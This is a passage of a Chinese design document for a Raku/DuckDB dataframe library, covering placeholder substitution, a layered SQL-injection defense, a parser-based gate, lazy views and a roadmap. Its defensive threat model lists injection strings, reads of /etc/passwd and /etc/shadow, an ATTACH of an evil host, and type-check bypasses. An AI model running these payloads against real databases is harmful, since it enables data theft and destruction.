生命周期：TEMP VIEW 是**连接级**的，连接关闭自动消失；Frame 用单调计数器
`__duckula_N` 命名避免撞名；`CREATE OR REPLACE` 保证重入安全。

### 9.4 占位符替换必须字符串感知

**不能** `$sql.subst('self', $view)`。会误伤五类内容：

| 要跳过的 | 示例 |
|---|---|
| 字符串字面量 | `'self'`、`'it''s self'` |
| 双引号标识符 | `"self"`（这是列名，不该换） |
| 行注释 | `-- self` |
| 块注释 | `/* self */` |
| 美元引用 | `$$ self $$` |

需要的是几十行的扫描器：逐字符走，遇到 `'` / `"` / `--` / `/*` / `$$` 就进入跳过模式，
只在裸标识符位置替换。写法与 Rakuish 的 `expand-backticks` 同构（同样是字符串感知扫描），
可直接借鉴那一套状态机。**这是词法扫描，不是解析器**——它不关心 SQL 语法结构。

实现（v0.3.0）：`Duckula::SQL::replace-bare-ident($sql, 'self', $view)`，复用 `code-mask`
的扫描结果，只在 `mask` 全为 True 的区间内匹配。三条边界规则：

| 规则 | 目的 |
|---|---|
| 前一字符不能是标识符字符，也不能是 `.` | `myself`、`t.self`（限定的列名）不动 |
| 后一字符不能是标识符字符 | `selfish`、`self_1` 不动 |
| 大小写不敏感 | SQL 标识符本就不区分，`SELF` 与 `self` 等价 |

后一条规则放宽了 `.`，所以 `self.city` → `__duckula_view_1.city` 正是想要的。

### 9.5 防注入：四类威胁与三层防线

> 现状（v0.2.0）：本节的纯函数层与网关已落地，见 `lib/Duckula/SQL.rakumod`、
> `lib/Duckula/Guard.rakumod`；回归测试 `t/01-sql.rakutest`（36 项）与
> `t/02-guard.rakutest`（12 项）全部通过。

Duckula 的注入面比传统 Web 应用**更宽**——DuckDB 能读写文件、能出网、能装扩展。所以防护不能只想着 `' OR 1=1`。

#### 9.5.1 威胁模型

| 类型 | 触发方式 | 典型例子 |
|---|---|---|
| 值注入 | 字符串插值拼进条件 | `$df.filter("city = '$input'")` |
| 标识符注入 | 列名 / 表名来自变量 | `$df.select($col)` |
| 字面量渲染 | 排序 / 选项拼字符串 | `$df.sort("$col $dir")` |
| 整条 SQL | 用户传完整语句 | `duckula.sql($user_sql)` |

#### 9.5.2 第一层：值永远走参数绑定（默认）

`Connection.query` 内部是 `prepare + execute`：`*@args` 绑到 `?`，`*%args` 绑到 `$name`
（走 `duckdb_bind_parameter_index`）。**值不经过 SQL 文本**。

```raku
$df.filter("city = ?", $city);        # 位置参数
$df.filter("city = $c", :c($city));   # 命名参数
```

实测（2026-11-20）：把 `"bj'; DROP TABLE t; --"` 当参数传入 → 匹配 0 行，表仍完好。

API 层强制：`filter(Str:D $pred, *@params)` 检查 `?` 个数与 `@params.elems` 是否相等，
不等直接 die。这样「忘了传参数」和「以为插值能用」都会当场暴露，而不是静默拼成串。

#### 9.5.3 第二层：标识符只走 quote-ident + 白名单

值能绑定，**标识符不能**（SQL 不允许 `SELECT ?` 当列名），只能转义：

```raku
sub quote-ident(Str:D $n --> Str) { '"' ~ $n.subst('"', '""', :g) ~ '"' }
```

实测：`amount"; DROP TABLE t; --` → `"amount""; DROP TABLE t; --"`，整体退化为一个合法列名。

再叠一层白名单：`$df.select($col)` 先校验 `$col ∈ $df.names`，未知列直接拒。
转义保证语法安全，白名单保证语义正确（防止拼错列名被静默当成新列）。

#### 9.5.4 第三层：SQL 直写网关

`duckula.sql(...)` / `$df.sql(...)` 是唯一允许整条 SQL 的入口，必须过三道闸：

| 闸 | 手段 | 实测结果 |
|---|---|---|
| 单语句 | `duckdb_extract_statements` 的条数 | `SELECT 1; SELECT 2` → 2 条，拒绝 |
| 只读语义 | `duckdb_prepared_statement_type` 白名单 + 写动词扫描 | `DROP` 判 DROP、`INSTALL` 判 LOAD、`PRAGMA enable_profiling` 判 SET ✓ |
| 参数对齐 | `duckdb_nparams` | `SELECT $1` 认作 1 个参数（数问号会漏） |
| 外部访问 | `SET enable_external_access=false` | 报 `Permission Error ... file system operations are disabled by configuration` ✓ |

默认走安全模式；`duckula.sql($sql, :unsafe)` 才放开，并记一条日志。

判定细节见 §9.5.6 —— v0.13.0 起这一层不再靠文本猜测。

#### 9.5.5 DuckDB 特有的攻击面（重点）

这比传统 SQL 注入更值得警惕，因为分析型数据库天生要碰文件：

| 攻击 | 语句 |
|---|---|
| 任意文件读 | `read_csv('/etc/passwd')` / `read_text('/etc/shadow')` |
| 任意文件写 | `COPY (SELECT ...) TO '/path'` |
| 出网 | `ATTACH 'http://evil/x.db'` |
| 装扩展 | `INSTALL httpfs; LOAD httpfs` |
| 跨库 | `ATTACH` 其他库文件 |

**一行 `SET enable_external_access=false` 全部切断**，这是 DuckDB 相对通用 ORM 的红利。
建议：凡 SQL 来自不可信来源（网表单、配置文件、多租户），构造 Duckula 时默认打开这个开关。

**这个开关是单向的。** 实测 `SET enable_external_access=true` 在运行中的数据库上会报
`Cannot enable external access while database is running` —— 一旦关掉就回不去。
所以不要在同一个连接上「先放开一会儿再关上」：需要外部访问的事请在开沙箱之前做完。

#### 9.5.6 判定来自解析器，不是正则（v0.13.0）

`Duckula::Guard.check-sql` 拿到连接时，判断句走 DuckDB 自己的解析器：

```
duckdb_extract_statements          拆成 N 条
  └ duckdb_prepare_extracted_statement   逐条编译（不执行）
      ├ duckdb_prepared_statement_type   它是什么
      └ duckdb_nparams                   它要几个参数
```

编译不执行，所以可以当分类器。2000 次解析耗时为 0ms（毫秒级计数器读不出），
不存在性能顾虑。

**但只看类型会漏。** 两条实测：

| SQL | `duckdb_statement_type` | 真实行为 |
|---|---|---|
| `WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d` | **SELECT** | 真的删 |
| `EXPLAIN ANALYZE DELETE FROM t` | **EXPLAIN** | 真的删（ANALYZE 会执行） |

所以守门是**两关，任一关判危险就拒**：

1. **类型白名单**——只放行 `SELECT(1)` 与 `EXPLAIN(4)`。这一关拿下 `INSTALL`
   （类型 LOAD）、`SET`、`COPY`、`CREATE`、`ATTACH`、多语句——都是解析器给的
   答案，不需要猜。
2. **写动词扫描**——`insert update delete drop create alter truncate` 六个词，
   在代码区（去字符串、去注释）里出现即拒。这一关专治上面那两种「类型撒谎」。

顺带的好处：`PRAGMA database_list` 类型是 SELECT、没有写动词，**放行**。正则时代
它因为含 `pragma` 一词被误拒。这是真解析最实际的收益。

**错误要分三种，不能混成一个「不安全」：**

| 情况 | 抛什么 | 为什么 |
|---|---|---|
| 根本不是 SQL（`SELEC 1`） | `Duckula::X::Guard`，reason 带 `Parser Error` 原话 | 文本不是 SQL |
| 是 SQL 但现在跑不了（表不存在） | 同上，reason 带 `Catalog Error` 原话 | 不能说成「被安全策略拦下」 |
| 类型不在白名单 / 藏了写动词 | 同上，reason 写明解析出的类型 | 这才是真的拒绝 |

`Session.classify($sql)` 是同一套设施的照镜子版本——只回答问题，不拦。

**两个坑：**

- `Frame.sql` 里 `self` 会替换成临时视图名。解析器要能看见那个视图，所以
  **必须先 `CREATE TEMP VIEW` 再 check**，否则永远报「表不存在」。校验失败要把
  视图拆掉，别留半成品。
- 拿不到连接时（`check-sql` 不传 `:conn`）退回原来的文本启发式。那条路径仍然
  可用，但 `PRAGMA database_list` 之类会被误拒——它的价值只剩「离线自查」。

### 9.6 惰性模式下怎么办（v0.9.0 落地）

- `Frame.sql(...)`：立即执行（pandas 语义），`self` 绑成临时视图。
- `LazyFrame.sql(...)`：**建视图这一步立刻做，查询留到 `collect`**。因为
  `CREATE VIEW` 没法推迟，只能先把上游渲染成 SQL、用 `Session.bind-view` 建好视图
  （视图里不能有占位符，参数先 `render-bindings` 固化），再把替换过 `self` 的用户
  SQL 包成一个新的 `Source` 节点。所以它是计划树的一个边界（§8.11）。

顺带：`Session.bind-view` 会把视图登记进 `drop-views` 的名单，长会话记得回收。

### 9.7 一个副作用要记住

`Frame` 必须始终携带自己的 `relation-sql`（一条 SELECT），哪怕它已经被物化成 Result。
否则 `$df.sql(...)` 无米下锅。这反过来强化了 SQL-first：**Frame 的真相是那条 SQL，不是那堆数据。**

还有一个连带要求：`relation-sql` 必须是**无参数**的。`CREATE TEMP VIEW ... AS <sql>` 不
接受绑定参数，所以 `render-bindings` 会用 `sql-literal` 把 `?` 按序内联成字面量，得到
一条自包含 SQL。执行时仍走真绑定（值不经过 SQL 文本），内联版本只用于回溯引用——
既保住了防注入，又让链式 `Frame.sql` 永远有米下锅。

## 10. 路线图

| 阶段 | 内容 | 依赖 |
|---|---|---|
| 0 | 骨架：META6 + `Duckula` 入口 + `read-csv` / `head` / `names` | ✅ v0.4.0 完成 |
| 1 | `Series` 薄包 ColumnView；`Frame` 薄包 Result；`sum/mean/min/max` | ✅ v0.4.0 完成 |
| 2 | 表达式系统 + `render` 成 SQL；`select` / `filter` / `with-column` | ✅ v0.5.0 完成 |
| 3 | SQL 入口：`duckula.sql` / `Frame.sql`；占位符扫描器；临时视图管理；参数绑定 + 注入网关 | ✅ v0.3.0 完成 |
| 4 | `LazyFrame` + 计划节点 + `collect`；结构融合；`LazyFrame.sql` | ✅ v0.9.0 完成（借鉴 `Planner`） |
| 5 | `join` / `group-by` / `sort` / `limit` / `window` | 阶段 2-4 ｜ 全部完成：`group-by`+`agg` ✅ v0.6.0；`join` ✅ v0.7.0；`limit` / `slice` / `tail` / `window` ✅ v0.8.0 |
| 6 | Arrow 导出，与 Python 的 pandas / Polars 交换 | ✅ 完成：schema + array ✅ v0.10.0（§8.12）；Arrow IPC 文件（file / stream）✅ v0.11.0（§8.13）；`ipc-buf` 内存字节出口 ✅ v0.14.0（裸指针的跨进程替代）。`ArrowArrayStream` 仍未做（同进程才有效，见 §8.12 末） |
| 7 | 写入：`Appender` 批量写、Parquet / CSV 落盘 | ✅ v0.12.0 完成（§8.14）：`to-parquet` / `to-csv` / `to-table` / `append-to` + `Session.insert`（复用 `Appender`） |
| 8 | 严格 SQL 安全校验（`duckdb_extract_statements` 绑定） | ✅ v0.13.0 完成（§9.5.6）：解析器判定 + 写动词扫描两层；DB::DuckDB 1.2.0 提供 `DB::DuckDB::Parser` |
| 9 | Arrow 读入：解 FlatBuffers + 列解码 + 临时表 | ✅ v0.14.0 完成（§8.15）：`read-arrow` / `describe-arrow`，file / stream 双格式，标量 / 字典 / `List<标量>` 全通 |
| 10 | 嵌套类型与字节可复现 | ✅ v0.15.0 完成：`Struct` / `Map` / `List<Struct>` 读入（§8.15）；写出侧 null 槽归一，同一份数据必写出同一串字节（§8.13） |
| 11 | 清洗与重塑：拼接 / 去重 / 频次 / 改名 / 删列 / 空值 / 类型转换 / 长宽互转 / 展开 / 采样 / 概览 | ✅ v0.16.0 第一批（§8.16）：`concat` `unique` `value-counts` `rename` `drop` `drop-nulls` `fill-nulls` `cast`；✅ v0.17.0 第二批（§8.17）：`pivot` `unpivot` `explode` `sample` `describe` |

| 12 | `read-arrow` 解码缓存 | ✅ v0.18.0 完成（§8.18）：进程级缓存纯解码产物，按「路径 + size + mtime」失效，跨 session 共享；FIFO 上限 8 个文件 |

> v0.18.0 完成了阶段 0–12 的全部内容。阶段 11 的日常动词齐了，阶段 12
> 把 Arrow 反复导入的解码开销也缓存掉了。
> 剩下的按「收益递减」排列：`ArrowArrayStream`（只为同进程零拷贝消费者存在，
> 字节流已覆盖它唯一的实际用途）、`FixedSizeList` / `Union` / `RunEndEncoded`
> 的读入。

每阶段都要有 `t/` 下的回归测试，双后端（MoarVM / rakupp）都要跑。

---

## 11. 参考索引

| 用途 | 路径 |
|---|---|
| DuckDB 驱动 | `C:\Users\Admin\DB-DuckDB`（v1.2.0） |
| 零拷贝列视图 | `lib/DB/DuckDB/ColumnView.rakumod` |
| Arrow 零拷贝 | `lib/DB/DuckDB/Arrow.rakumod` |
| Arrow IPC 规范 | <https://arrow.apache.org/docs/format/Columnar.html> · <https://arrow.apache.org/docs/format/Columnar.html#ipc-file-format> |
| FlatBuffers 格式 | <https://flatbuffers.dev/internals/>（vtable / soffset 那节） |
| 结果集接口 | `lib/DB/DuckDB/Result.rakumod` |
| SQL 纯函数 | `C:\Users\Admin\Documents\Trae-CN\temp_20261103_01\ducketl\lib\App\DuckETL\SQL.rakumod` |
| 计划器 | 同上 `Planner.rakumod` |
| 链式 DSL 参考 | 同上 `DSL.rakumod` |
